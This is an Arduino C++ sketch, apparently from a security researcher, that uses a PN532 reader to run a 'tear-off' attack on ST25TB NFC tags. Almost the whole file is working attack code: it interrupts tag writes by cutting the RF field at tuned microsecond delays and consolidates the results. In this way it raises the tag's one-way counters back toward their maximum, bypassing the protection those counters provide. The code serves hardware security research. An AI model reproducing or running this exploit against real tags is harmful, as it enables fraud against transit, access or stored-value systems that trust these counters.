/* Benjamin DELPY `gentilkiwi`
   LabSec - DGSI DIT ARCOS
   benjamin.delpy@banque-france.fr / benjamin@gentilkiwi.com
   Licence : https://creativecommons.org/licenses/by/4.0/
   ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ----
   Tear off code logic below is 99.9% by:
   `SecLabz` from his near-field-chaos project
   https://github.com/SecLabz/near-field-chaos
*/
#pragma GCC optimize("-Ofast")
#include <kpn532_st25tb.h>
#define KPN532_0_CS 10
#define KPN532_0_IRQ 3

#define KPN532_ST25TB_TEAROFF_LOG 1

ST25TB *pST25TB;

void ISR_NFC0() {
  pST25TB->pNFC->IrqState = 0;
}

bool MODE_tear_Counter(const uint8_t counter, const uint32_t current, uint32_t target);
bool st25tb_tear_off(const int8_t block_address, uint32_t current_value, uint32_t target_value, uint32_t tear_off_adjustment_us);

void setup(void) {
  Serial.begin(115200);
  while (!Serial)
    ;
  PN532::InitGlobalSPI();

  randomSeed(analogRead(0));

  Serial.println("-st25tb tearoff-");

  pST25TB = new ST25TB(KPN532_0_CS, KPN532_0_IRQ, ISR_NFC0);
  pST25TB->begin();
}

void loop(void) {
  MOD_Tear();

  Serial.print("END");
  while (1)
    ;
}

#if defined(ARDUINO_AVR_UNO)  // || defined(ARDUINO_AVR_LEONARDO) -- differences because of != CPU and != SPI
#define TEAR_SPECIFIC_PRE_TIMER 1270
#elif defined(ARDUINO_UNOR4_MINIMA)
#define TEAR_SPECIFIC_PRE_TIMER 1279
#else
#error Platform not tested or supported
#endif

#define TIMER_delay_Milliseconds(x) delay(x)
#define TIMER_delay_Microseconds(x) delayMicroseconds(x)
#define RAND_Generate(x) random(x)
#define TIMER_Tear_DelayMicroseconds(x) TIMER_delay_Microseconds(TEAR_SPECIFIC_PRE_TIMER + (x))

#define TEAR_OFF_START_OFFSET_US 90
#define TEAR_OFF_ADJUSTMENT_US 25

#define RED "(R) "
#define BLUE "(B) "
#define GREEN "(G) "

bool MODE_tear_Counter(const uint8_t counter, const uint32_t current, uint32_t target) {
  bool ret;
  unsigned long diff_time, minutes, seconds;

  Serial.print(counter);
  Serial.print("t|");
#if !KPN532_ST25TB_TEAROFF_LOG
  Serial.print(" ...");
#endif
  if (current < target) {
    diff_time = millis();
    ret = st25tb_tear_off(counter, current, target, 0);
    diff_time = millis() - diff_time;
    minutes = diff_time / 60000;
    seconds = (diff_time % 60000) / 1000;

    Serial.println();
    Serial.print(' ');
    if (minutes) {
      Serial.print(minutes);
      Serial.print("m ");
    }
    Serial.print(seconds);
    Serial.print("s - ");
    if (ret) {
      Serial.println("OK");
    } else {
      Serial.println("KO :(");
    }
  } else {
    Serial.println(" not needed");
    ret = true;
  }

  return ret;
}

void MOD_Tear() {
  uint8_t UID[8];
  bool retS5, retS6;
  uint32_t c_sector5 = 0, c_sector6 = 0, t_sector5, t_sector6;

  pST25TB->pNFC->RfConfiguration__RF_field(0x01);

  Serial.print("~wait for ST25TB");
  if (pST25TB->Initiator_Initiate_Select_UID_C1_C2(UID, (uint8_t *)&c_sector5, (uint8_t *)&c_sector6)) {
    Serial.println();
    PN532::PrintHex(UID, sizeof(UID), PN532_PRINTHEX_REV);

    t_sector5 = t_sector6 = 0xfffffffe;
    //t_sector5 = 0x04000009;
    //t_sector6 = 0xfffffffd;

    Serial.print(ST25TB_IDX_COUNTER1);
    Serial.print("c|");
    PN532::PrintHex((const byte *)&c_sector5, sizeof(c_sector5), PN532_PRINTHEX_REV);
    Serial.print(ST25TB_IDX_COUNTER1);
    Serial.print("w|");
    PN532::PrintHex((const byte *)&t_sector5, sizeof(t_sector5), PN532_PRINTHEX_REV);

    Serial.print(ST25TB_IDX_COUNTER2);
    Serial.print("c|");
    PN532::PrintHex((const byte *)&c_sector6, sizeof(c_sector6), PN532_PRINTHEX_REV);
    Serial.print(ST25TB_IDX_COUNTER2);
    Serial.print("w|");
    PN532::PrintHex((const byte *)&t_sector6, sizeof(t_sector6), PN532_PRINTHEX_REV);

    pST25TB->bIgnoreTiming = 0x01;

    retS5 = MODE_tear_Counter(ST25TB_IDX_COUNTER1, c_sector5, t_sector5);
    retS6 = MODE_tear_Counter(ST25TB_IDX_COUNTER2, c_sector6, t_sector6);

    pST25TB->bIgnoreTiming = 0x00;
  }
  pST25TB->pNFC->RfConfiguration__RF_field(0x00);
}

uint32_t st25tb_tear_off_next_value(uint32_t current_value, bool randomness) {
  int8_t i;
  uint32_t svalue;

  for (i = 31; i >= 16; i--)  // prevent to go to very dangerous value here :)
  {
    if (current_value & ((uint32_t)1 << i))  // search first '1'
    {
      svalue = (uint32_t)(~0) >> (31 - i);

      for (i--; i >= 0; i--) {
        if (!(current_value & ((uint32_t)1 << i)))  // search first '0', after the first '1'
        {
          break;
        }
      }

      i++;  // also dealing with -1 here
      svalue &= ~((uint32_t)1 << i);

      // Set a random bit to zero to help flipping
      if (randomness && (svalue < 0xf0000000) && (i > 1)) {
        svalue ^= ((uint32_t)1 << (RAND_Generate(i)));
      }

      return svalue;
    }
  }

  return 0;
}

uint8_t st25tb_tear_off_retry_write_verify(const uint8_t block_address, uint32_t target_value, uint32_t max_try_count, uint32_t *read_back_value) {
  uint32_t i = 0;

  for (i = 0; (i < max_try_count) && (*read_back_value != target_value); i++) {
    pST25TB->Write_Block(block_address, (const uint8_t *)&target_value);
    pST25TB->Read_Block(block_address, (uint8_t *)read_back_value);
  }

  return (*read_back_value == target_value);
}

uint8_t st25tb_tear_off_is_consolidated(const uint8_t block_address, uint32_t value, int repeat_read, int sleep_time_ms, uint32_t *read_value) {
  uint8_t result, i;
  for (i = 0; i < repeat_read; i++) {
    TIMER_delay_Milliseconds(sleep_time_ms);
    result = pST25TB->Read_Block(block_address, (uint8_t *)read_value);

    if (!result || (value != *read_value)) {
      return 0;
    }
  }

  return 1;
}

uint8_t st25tb_tear_off_consolidate_block(const uint8_t block_address, uint32_t current_value, uint32_t target_value, uint32_t *read_back_value) {
  uint8_t result, bAdjusted;

  if ((target_value <= 0xfffffffd) && (current_value >= (target_value + 2))) {
    target_value += 2;
    bAdjusted = 1;
  } else {
    target_value = current_value;
    bAdjusted = 0;
  }

  result = st25tb_tear_off_retry_write_verify(block_address, target_value - 1, 30, read_back_value);
  if (!result) {
    return 0;
  }

  if ((*read_back_value < 0xfffffffe) || bAdjusted) {
    result = st25tb_tear_off_retry_write_verify(block_address, target_value - 2, 30, read_back_value);
    if (!result) {
      return 0;
    }
  }

  if ((target_value >= 0xfffffffd) && (*read_back_value >= 0xfffffffd)) {
    result = st25tb_tear_off_is_consolidated(block_address, *read_back_value, 6, 10, read_back_value);
    if (result) {
      Serial.println();
      Serial.print("consolidating");
      result = st25tb_tear_off_is_consolidated(block_address, *read_back_value, 2, 2000, read_back_value);
      if (!result) {
        return 0;
      }
    }
  }

  return 1;
}

void st25tb_tear_off_log(int tear_off_us, const char *color, uint32_t value) {
#if KPN532_ST25TB_TEAROFF_LOG
  Serial.println();
  PN532::PrintHex((const byte *)&value, sizeof(value), PN532_PRINTHEX_REV | PN532_PRINTHEX_NOLN);

  Serial.print(' ');
  Serial.print(tear_off_us);
  Serial.print('u');
#else
  (void)tear_off_us;
  (void)color;
  (void)value;
#endif
}

void st25tb_tear_off_adjust_timing(int *tear_off_us, uint32_t tear_off_adjustment_us) {
  if ((*tear_off_us) > TEAR_OFF_START_OFFSET_US) {
    *tear_off_us -= tear_off_adjustment_us;
  }
}

bool st25tb_tear_off(const int8_t block_address, uint32_t current_value, uint32_t target_value, uint32_t tear_off_adjustment_us) {
  uint8_t result;
  bool trigger = true;

  uint32_t read_value, last_consolidated_value = 0, tear_off_value;

  int tear_off_us = TEAR_OFF_START_OFFSET_US;
  if (tear_off_adjustment_us == 0) {
    tear_off_adjustment_us = TEAR_OFF_ADJUSTMENT_US;
  }

  tear_off_value = st25tb_tear_off_next_value(current_value, false);

  if (tear_off_value == 0) {
    Serial.println("|Tear| Tear off technique not possible.");
    return false;
  }

  while (true) {
    // Fail safe
    if (tear_off_value < 0x00100000) {
      Serial.println("|Tear| Stopped. Safety first !");
      return false;
    }

    // Tear off write
    pST25TB->Write_Block_noflush_notimer(block_address, (const uint8_t *)&tear_off_value);
    TIMER_Tear_DelayMicroseconds(tear_off_us);
    pST25TB->pNFC->RfConfiguration__RF_field_fast(0x00, 700);
    // Read back potentially new value
    pST25TB->pNFC->RfConfiguration__RF_field_fast(0x01, 700);
    pST25TB->Initiator_Initiate_Select_Read_Block(block_address, (uint8_t *)&read_value);

    // Act
    if (read_value > current_value) {
      if (read_value >= 0xfffffffe || (read_value - 2) > target_value || read_value != last_consolidated_value || ((read_value & 0xf0000000) > (current_value & 0xf0000000))) {
        pST25TB->bIgnoreTiming = 0x00;
        result = st25tb_tear_off_consolidate_block(block_address, read_value, target_value, &current_value);
        pST25TB->bIgnoreTiming = 0x01;
        if (result && (current_value == target_value)) {
          return true;
        }
        if (read_value != last_consolidated_value) {
          st25tb_tear_off_adjust_timing(&tear_off_us, tear_off_adjustment_us);
        }
        last_consolidated_value = read_value;
        tear_off_value = st25tb_tear_off_next_value(current_value, false);
        trigger = true;
        st25tb_tear_off_log(tear_off_us, GREEN, read_value);
      }
    } else if (read_value == tear_off_value) {
      tear_off_value = st25tb_tear_off_next_value(read_value, trigger);
      trigger = !trigger;
      current_value = read_value;
      st25tb_tear_off_adjust_timing(&tear_off_us, tear_off_adjustment_us);
      st25tb_tear_off_log(tear_off_us, BLUE, read_value);
    } else if (read_value < tear_off_value) {
      tear_off_value = st25tb_tear_off_next_value(read_value, false);
      trigger = true;
      current_value = read_value;
      st25tb_tear_off_adjust_timing(&tear_off_us, tear_off_adjustment_us);
      st25tb_tear_off_log(tear_off_us, RED, read_value);
    }

    tear_off_us++;
  }
}
